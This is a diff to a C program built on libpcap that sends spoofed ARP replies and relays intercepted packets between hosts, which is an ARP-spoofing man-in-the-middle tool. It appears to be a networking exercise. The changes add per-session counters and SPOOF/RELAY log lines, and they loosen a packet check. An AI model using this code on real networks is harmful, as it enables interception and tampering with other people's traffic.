@@ -64,6 +64,7 @@ struct t_index{
 	struct eth_arp s_arp;
 	char * dev;
 	unsigned char * t_mac;
+	uint8_t cnt;
 };
 #pragma pack(8)
 void debug(struct eth_arp s_arp){
@@ -131,12 +132,8 @@ uint32_t getIpAddress (const char * ifr) {
 int check_p(const u_char* packet2,struct eth_arp s_arp){
 	struct eth_arp *target=(struct eth_arp*)packet2;
 	if(target->e.e_type==s_arp.e.e_type){
-//		if(memcmp(target->e.des_mac,"\xff\xff\xff\xff\xff\xff",6)!=-1){
-//				printf("BC\n");
-			if(target->a.sender_mac!=s_arp.a.target_mac);
-				return 0;
-			}
-	//	}
+			return 0;
+		}
 
 	return -1;
 }
@@ -164,9 +161,12 @@ void *thread_main(void *arg){
 					t1->e.des_mac[i]=argv.t_mac[i];
 				}
 			}
+			puts("------------------------------------------------");
+			printf("SET[%d] : RELAY\n\n",argv.cnt);
 			pcap_sendpacket(handle,(unsigned char *)t1,header->caplen);  //relay
 		}else{
-			debug(argv.s_arp);
+			puts("------------------------------------------------");
+			printf("SET[%d] : SPOOF\n\n",argv.cnt);
   			pcap_sendpacket(handle,(unsigned char *)&argv.s_arp,42); //spoof
 		}
 	}
@@ -195,7 +195,7 @@ int main(int argc, char* argv[]) {
   pthread_t t_id[t_len];
     
 
-  for(int i =0, j=0;i<argc/2;i+=2,j++){
+  for(int i =0, j=0;i<=t_len;i+=2,j++){
   s_arp = getmac(s_arp,dev);
   s_arp.a.sender_ip=getIpAddress(argv[1]);
   memcpy(s_arp.e.des_mac,"\xff\xff\xff\xff\xff\xff",6);
@@ -244,6 +244,7 @@ int main(int argc, char* argv[]) {
   argvs.s_arp = s_arp;
   argvs.dev = dev;
   argvs.t_mac = t_mac;
+  argvs.cnt = j;
   pcap_sendpacket(handle,(const u_char *)&s_arp,42);
   if(pthread_create(&t_id[j],NULL,thread_main,(void *)&argvs)!=0){
 	puts("thread Error");
